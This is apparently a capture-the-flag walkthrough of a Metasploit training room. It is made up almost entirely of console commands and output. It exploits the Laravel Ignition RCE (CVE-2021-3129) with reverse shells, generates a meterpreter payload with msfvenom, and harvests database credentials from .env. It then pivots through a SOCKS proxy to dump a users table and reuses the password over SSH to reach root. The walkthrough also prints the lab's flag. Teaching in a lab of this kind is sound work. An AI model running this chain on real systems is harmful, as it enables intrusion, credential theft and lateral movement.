# Deploy the attached VM, and wait a few minutes. What ports are open?

## 80

```console
❯ rustscan -a 10.10.37.85  --ulimit 5000 -- -sC -sV | tee rustscan.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/divu050704/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.37.85:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-13 18:40 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:40
Completed NSE at 18:40, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:40
Completed NSE at 18:40, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:40
Completed NSE at 18:40, 0.00s elapsed
Initiating Ping Scan at 18:40
Scanning 10.10.37.85 [2 ports]
Completed Ping Scan at 18:40, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:40
Completed Parallel DNS resolution of 1 host. at 18:40, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:40
Scanning 10.10.37.85 [1 port]
Discovered open port 80/tcp on 10.10.37.85
Completed Connect Scan at 18:40, 0.15s elapsed (1 total ports)
Initiating Service scan at 18:40
Scanning 1 service on 10.10.37.85
Completed Service scan at 18:40, 6.45s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.37.85.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:40
Completed NSE at 18:40, 4.60s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:40
Completed NSE at 18:41, 0.76s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:41
Completed NSE at 18:41, 0.00s elapsed
Nmap scan report for 10.10.37.85
Host is up, received syn-ack (0.15s latency).
Scanned at 2022-12-13 18:40:48 IST for 12s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Curabitur aliquet, libero id suscipit semper
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:41
Completed NSE at 18:41, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:41
Completed NSE at 18:41, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:41
Completed NSE at 18:41, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.84 seconds

```

# What framework is the web application developed with?

## laravel

```html
<div class="ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0">
   Laravel v8.26.1 (PHP v7.4.30)
</div>
```

# What CVE is the application vulnerable to?

## CVE-2021-3129

(https://www.ambionics.io/blog/laravel-debug-rce)

```console
msf6 > info 1

       Name: Unauthenticated remote code execution in Ignition
     Module: exploit/multi/php/ignition_laravel_debug_rce
   Platform: Unix, Linux, OSX, Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2021-01-13

Provided by:
  Heyder Andrade <eu@heyderandrade.org>
  ambionics

Module side effects:
 ioc-in-logs

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
  Id  Name
  --  ----
  0   Unix (In-Memory)
  1   Windows (In-Memory)

Check supported:
  Yes

Basic options:
  Name       Current Setting              Required  Description
  ----       ---------------              --------  -----------
  LOGFILE                                 no        Laravel log file absolute path
  Proxies                                 no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                                  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
  RPORT      80                           yes       The target port (TCP)
  SSL        false                        no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /_ignition/execute-solution  yes       Ignition execute solution path
  VHOST                                   no        HTTP server virtual host

Payload information:

Description:
  Ignition before 2.5.2, as used in Laravel and other products, allows 
  unauthenticated remote attackers to execute arbitrary code because 
  of insecure usage of file_get_contents() and file_put_contents(). 
  This is exploitable on sites using debug mode with Laravel before 
  8.4.2.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2021-3129
  https://www.ambionics.io/blog/laravel-debug-rce
```

# What command can be used to upgrade the last opened session to a Meterpreter session?

## sessions -u -1

# What file indicates a session has been opened within a Docker container?


- Exploited  the vulnerability and got us a shell

```console
msf6 exploit(multi/php/ignition_laravel_debug_rce) > show options

Module options (exploit/multi/php/ignition_laravel_debug_rce):

   Name       Current Setting              Required  Description
   ----       ---------------              --------  -----------
   LOGFILE                                 no        Laravel log file absolute path
   Proxies                                 no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80                           yes       The target port (TCP)
   SSL        false                        no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /_ignition/execute-solution  yes       Ignition execute solution path
   VHOST                                   no        HTTP server virtual host


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Unix (In-Memory)


msf6 exploit(multi/php/ignition_laravel_debug_rce) > set RHOSTS 10.10.37.85 
RHOSTS => 10.10.37.85
msf6 exploit(multi/php/ignition_laravel_debug_rce) > set LHOST tun0
LHOST => 10.17.0.215
msf6 exploit(multi/php/ignition_laravel_debug_rce) > exploit

[*] Started reverse TCP handler on 10.17.0.215:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking component version to 10.10.37.85:80
[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/php/ignition_laravel_debug_rce) > set ForceExploit true
ForceExploit => true
msf6 exploit(multi/php/ignition_laravel_debug_rce) > exploit

[*] Started reverse TCP handler on 10.17.0.215:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking component version to 10.10.37.85:80
[!] The target is not exploitable. ForceExploit is enabled, proceeding with exploitation.
[*] Command shell session 1 opened (10.17.0.215:4444 -> 10.10.37.85:52084) at 2022-12-13 18:59:07 +0530

ls
favicon.ico
index.php
robots.txt
web.config

```


- Damn, we need a `meterpreter` shell, but this shell is not compatible with exploit.

```console
msf6 exploit(multi/php/ignition_laravel_debug_rce) > exploit

[-] Exploit failed: linux/x86/meterpreter/reverse_tcp is not a compatible payload.

```


- Made a payload with `msfvenom`, started a `exploit/multi/handler` exploit.

```console
❯ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=tun0 LPORT=1234 -f elf -o payload.bin
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
Saved as: payload.bin
```

- Uploaded the shell with simple python http server

```console
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PayLOAD linux/x86/meterpreter/reverse_tcp
PayLOAD => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.17.0.215:1234 
[*] Sending stage (989032 bytes) to 10.10.37.85
[*] Meterpreter session 1 opened (10.17.0.215:1234 -> 10.10.37.85:55662) at 2022-12-13 19:32:45 +0530

meterpreter >
```

# What file indicates a session has been opened within a Docker container?

## .dockerenv

```console
meterpreter > ls /
Listing: /
==========

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100755/rwxr-xr-x  0     fil   2022-09-14 01:09:42 +0530  .dockerenv
040755/rwxr-xr-x  4096  dir   2022-09-13 15:18:51 +0530  bin
040755/rwxr-xr-x  4096  dir   2022-09-03 17:40:00 +0530  boot
040755/rwxr-xr-x  340   dir   2022-12-13 18:20:19 +0530  dev
040755/rwxr-xr-x  4096  dir   2022-09-14 01:09:42 +0530  etc
040755/rwxr-xr-x  4096  dir   2022-09-03 17:40:00 +0530  home
040755/rwxr-xr-x  4096  dir   2022-09-13 15:15:24 +0530  lib
040755/rwxr-xr-x  4096  dir   2022-09-12 05:30:00 +0530  lib64
040755/rwxr-xr-x  4096  dir   2022-09-12 05:30:00 +0530  media
040755/rwxr-xr-x  4096  dir   2022-09-12 05:30:00 +0530  mnt
040755/rwxr-xr-x  4096  dir   2022-09-12 05:30:00 +0530  opt
040555/r-xr-xr-x  0     dir   2022-12-13 18:20:19 +0530  proc
040700/rwx------  4096  dir   2022-09-13 22:33:40 +0530  root
040755/rwxr-xr-x  4096  dir   2022-09-13 15:18:53 +0530  run
040755/rwxr-xr-x  4096  dir   2022-09-13 15:18:51 +0530  sbin
040755/rwxr-xr-x  4096  dir   2022-09-12 05:30:00 +0530  srv
040555/r-xr-xr-x  0     dir   2022-12-13 18:20:19 +0530  sys
041777/rwxrwxrwx  4096  dir   2022-12-13 19:31:51 +0530  tmp
040755/rwxr-xr-x  4096  dir   2022-09-12 05:30:00 +0530  usr
040755/rwxr-xr-x  4096  dir   2022-09-13 15:15:28 +0530  var
```


# What file often contains useful credentials for web applications?

## .env

```console
meterpreter > ls /var/www/
Listing: /var/www/
==================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100644/rw-r--r--  868     fil   2022-09-12 22:38:52 +0530  .env
040755/rwxr-xr-x  4096    dir   2022-09-13 22:25:46 +0530  app
100755/rwxr-xr-x  1686    fil   2022-09-11 06:14:10 +0530  artisan
040755/rwxr-xr-x  4096    dir   2022-09-13 22:29:46 +0530  bootstrap
100644/rw-r--r--  1613    fil   2022-09-11 06:14:10 +0530  composer.json
100644/rw-r--r--  247888  fil   2022-09-11 06:31:13 +0530  composer.lock
040755/rwxr-xr-x  4096    dir   2022-09-13 22:25:46 +0530  config
040755/rwxr-xr-x  4096    dir   2022-09-13 22:25:46 +0530  database
040755/rwxr-xr-x  4096    dir   2022-12-13 19:24:26 +0530  html
100644/rw-r--r--  944     fil   2022-09-11 06:14:10 +0530  package.json
040755/rwxr-xr-x  4096    dir   2022-09-13 22:25:46 +0530  resources
040755/rwxr-xr-x  4096    dir   2022-09-13 22:25:46 +0530  routes
100644/rw-r--r--  563     fil   2022-09-11 06:14:10 +0530  server.php
040755/rwxr-xr-x  4096    dir   2022-09-13 22:29:46 +0530  storage
040755/rwxr-xr-x  4096    dir   2022-09-13 22:34:52 +0530  vendor
100644/rw-r--r--  559     fil   2022-09-11 06:44:21 +0530  webpack.mix.js
```


# What database table contains useful credentials?


## users

```console
meterpreter > cat /var/www/.env
<---------------------snip--------------------->

DB_CONNECTION=pgsql
DB_HOST=webservice_database
DB_PORT=5432
DB_DATABASE=postgres
DB_USERNAME=postgres
DB_PASSWORD=postgres
<--------------------snip----------------------->
```

- There is a database running `pgsql` which can be confirmed with 

```console
meterpreter > resolve webservice_database 

Host resolutions
================

    Hostname             IP Address
    --------             ----------
    webservice_database  172.28.101.51

```

- Routed database and the docker 

```console
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  1         meterpreter x86/linux  www-data @ 172.28.101.50  10.17.0.215:1234 -> 10.10.37.85:55662 (172.28.101.50)

msf6 exploit(multi/handler) > route add 172.28.101.51/32 -1
[*] Route added
msf6 exploit(multi/handler) > route add 172.17.0.1/32 -1
[*] Route added
msf6 exploit(multi/handler) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.17.0.1         255.255.255.255    Session 1
   172.28.101.51      255.255.255.255    Session 1

[*] There are currently no IPv6 routes defined.

```

- Now we will dump the schema with `auxiliary/scanner/postgres/postgres_schemadump`

```console
msf6 exploit(multi/handler) > use auxiliary/scanner/postgres/postgres_schemadump
msf6 auxiliary(scanner/postgres/postgres_schemadump) > run postgres://postgres:postgres@172.28.101.51/postgres

[*] 172.28.101.51:5432 - Found databases: postgres, template1, template0. Ignoring template1, template0.
[+] Postgres SQL Server Schema 
 Host: 172.28.101.51 
 Port: 5432 
 ====================

---
- DBName: postgres
  Tables:
  - TableName: users_id_seq
    Columns:
    - ColumnName: last_value
      ColumnType: int8
      ColumnLength: '8'
    - ColumnName: log_cnt
      ColumnType: int8
      ColumnLength: '8'
    - ColumnName: is_called
      ColumnType: bool
      ColumnLength: '1'
  - TableName: users
    Columns:
    - ColumnName: id
      ColumnType: int4
      ColumnLength: '4'
    - ColumnName: username
      ColumnType: varchar
      ColumnLength: "-1"
    - ColumnName: password
      ColumnType: varchar
      ColumnLength: "-1"
    - ColumnName: created_at
      ColumnType: timestamp
      ColumnLength: '8'
    - ColumnName: deleted_at
      ColumnType: timestamp
      ColumnLength: '8'
  - TableName: users_pkey
    Columns:
    - ColumnName: id
      ColumnType: int4
      ColumnLength: '4'

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

- We found a table named users with column `username` and `password`. 

# What is Santa's password?

## p4\$\$w0rd 

- Now we will try to read table `users`

```console
msf6 auxiliary(scanner/postgres/postgres_schemadump) > use auxiliary/admin/postgres/postgres_sql 
msf6 auxiliary(admin/postgres/postgres_sql) > run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'
[*] Running module against 172.28.101.51

Query Text: 'select * from users'
=================================

    id  username  password  created_at                  deleted_at
    --  --------  --------  ----------                  ----------
    1   santa     p4$$w0rd  2022-09-13 19:39:51.669279  NIL

[*] Auxiliary module execution completed

```

# What ports are open on the host machine?

## 22,80

- We can use `auxiliary/server/socks_proxy` to further pivot the network, or `chisel`, but this room is about `Metapsloit` so we will use the first one.

```console
msf6 auxiliary(admin/postgres/postgres_sql) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > run srvhost=127.0.0.1 srvport=9050 version=4a
[*] Auxiliary module running as background job 0.
msf6 auxiliary(server/socks_proxy) > sessions

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  1         meterpreter x86/linux  www-data @ 172.28.101.50  10.17.0.215:1234 -> 10.10.37.85:55662 (172.28.101.50)
```

- Now we can start scanning ports

```console
msf6 auxiliary(server/socks_proxy) > proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1 
[*] exec: proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1 

Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-13 20:04 IST
Nmap scan report for 172.17.0.1
Host is up (0.20s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
443/tcp  closed https
5432/tcp closed postgresql

Nmap done: 1 IP address (1 host up) scanned in 1.06 seconds
```

# What is the root flag?

## THM{47C61A0FA8738BA77308A8A600F88E4B}

- We can Secure shell to machine by an assumption that `santa` is reusing his password, i.e., `p4$$w0rd` 

```console
msf6 auxiliary(server/socks_proxy) > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 172.17.0.1 
RHOSTS => 172.17.0.1
msf6 auxiliary(scanner/ssh/ssh_login) > set PASSWORD p4$$w0rd
PASSWORD => p4$$w0rd
msf6 auxiliary(scanner/ssh/ssh_login) > set UsERNaME santa
UsERNaME => santa
msf6 auxiliary(scanner/ssh/ssh_login) > run

[*] 172.17.0.1:22 - Starting bruteforce
[+] 172.17.0.1:22 - Success: 'santa:p4$$w0rd' 'uid=0(root) gid=0(root) groups=0(root) Linux hostname 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 2 opened (10.17.0.215-10.10.37.85:39454 -> 172.17.0.1:22) at 2022-12-13 20:09:24 +0530
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 2
[*] Starting interaction with 2...

mesg: ttyname failed: Inappropriate ioctl for device
ls
root.txt
cat root.txt
THM{47C61A0FA8738BA77308A8A600F88E4B}

```